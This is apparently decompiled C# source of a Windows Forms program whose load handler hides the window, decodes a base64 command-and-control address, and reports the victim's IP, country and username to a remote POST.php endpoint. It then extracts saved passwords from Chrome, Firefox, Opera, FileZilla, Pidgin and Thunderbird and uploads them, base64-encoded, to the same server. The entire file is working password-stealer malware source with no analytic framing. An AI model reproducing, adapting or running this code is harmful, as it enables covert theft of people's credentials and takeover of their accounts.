using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication710
{
	// Token: 0x02000008 RID: 8
	[DesignerGenerated]
	public partial class Form1 : Form
	{
		// Token: 0x06000020 RID: 32 RVA: 0x000020E9 File Offset: 0x000002E9
		public Form1()
		{
			base.Load += this.Form1_Load;
			Form1.__ENCAddToList(this);
			this.Host = "HHHH";
			this.InitializeComponent();
		}

		// Token: 0x06000021 RID: 33 RVA: 0x00002660 File Offset: 0x00000860
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form1.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
					{
						int num = 0;
						int num2 = 0;
						int num3 = Form1.__ENCList.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = Form1.__ENCList[num4];
							if (weakReference.IsAlive)
							{
								if (num4 != num)
								{
									Form1.__ENCList[num] = Form1.__ENCList[num4];
								}
								num++;
							}
							num4++;
						}
						Form1.__ENCList.RemoveRange(num, Form1.__ENCList.Count - num);
						Form1.__ENCList.Capacity = Form1.__ENCList.Count;
					}
					Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x06000024 RID: 36 RVA: 0x000027F4 File Offset: 0x000009F4
		public string Gets(string Url, CookieContainer Cookies)
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Url);
			httpWebRequest.CookieContainer = Cookies;
			httpWebRequest.Credentials = CredentialCache.DefaultCredentials;
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream, Encoding.Default);
			string result = streamReader.ReadToEnd();
			streamReader.Close();
			httpWebResponse.Close();
			return result;
		}

		// Token: 0x06000025 RID: 37 RVA: 0x0000285C File Offset: 0x00000A5C
		public string Posts(string Data, string Url, CookieContainer Cookies)
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Url);
			httpWebRequest.CookieContainer = Cookies;
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = "application/x-www-form-urlencoded";
			byte[] bytes = Encoding.UTF8.GetBytes(Data);
			httpWebRequest.ContentLength = (long)bytes.Length;
			Stream stream = httpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
			stream.Close();
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			stream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(stream, Encoding.Default);
			string result = streamReader.ReadToEnd();
			streamReader.Close();
			stream.Close();
			httpWebResponse.Close();
			return result;
		}

		// Token: 0x06000026 RID: 38 RVA: 0x0000290C File Offset: 0x00000B0C
		[MethodImpl(MethodImplOptions.NoOptimization)]
		private void Form1_Load(object sender, EventArgs e)
		{
			this.Hide();
			this.ShowInTaskbar = false;
			this.Host = Encoding.Default.GetString(Convert.FromBase64String(this.Host));
			string text = Interaction.Environ("username");
			string value = Regex.Match(this.Gets("http://ip-api.com/json", new CookieContainer()), "\"query\":\"(.*?)\"").Groups[1].Value;
			string text2 = Conversions.ToString(DateTime.Today.Date);
			string value2 = Regex.Match(this.Gets("http://ip-api.com/json", new CookieContainer()), "\"country\":\"(.*?)\"").Groups[1].Value;
			string str = this.Posts(string.Concat(new string[]
			{
				"ip=",
				value,
				"&computername=",
				text,
				"&installdate=",
				text2,
				"&country=",
				value2
			}), this.Host + "POST.php?online", new CookieContainer());
			string text3 = null;
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (Operators.CompareString(driveInfo.RootDirectory.FullName, "C:\\", false) == 0)
				{
					PREC prec = new PREC(driveInfo);
					PREC prec2 = prec;
					prec2.RecoverChrome();
					prec2.RecoverFileZilla();
					prec2.RecoverFireFox();
					prec2.RecoverOpera();
					prec2.RecoverPidgin();
					prec2.RecoverThunderbird();
					try
					{
						foreach (Account account in prec.Accounts)
						{
							text3 = string.Concat(new string[]
							{
								text3,
								"\r\n\r\n  ----[ ",
								Conversions.ToString((int)account.Type),
								" ]----  \r\n  { Domain : ",
								account.Domain,
								" }  \r\n  { Username : ",
								account.Username,
								" }  \r\n  { Password : ",
								account.Password,
								" }  \r\n"
							});
						}
					}
					finally
					{
						List<Account>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
				}
			}
			this.Posts("id=" + str + "&pass=" + Convert.ToBase64String(Encoding.UTF8.GetBytes(text3)), this.Host + "POST.php?passwordenter", new CookieContainer());
			ProjectData.EndApp();
		}

		// Token: 0x0400000A RID: 10
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x0400000C RID: 12
		public string Host;
	}
}
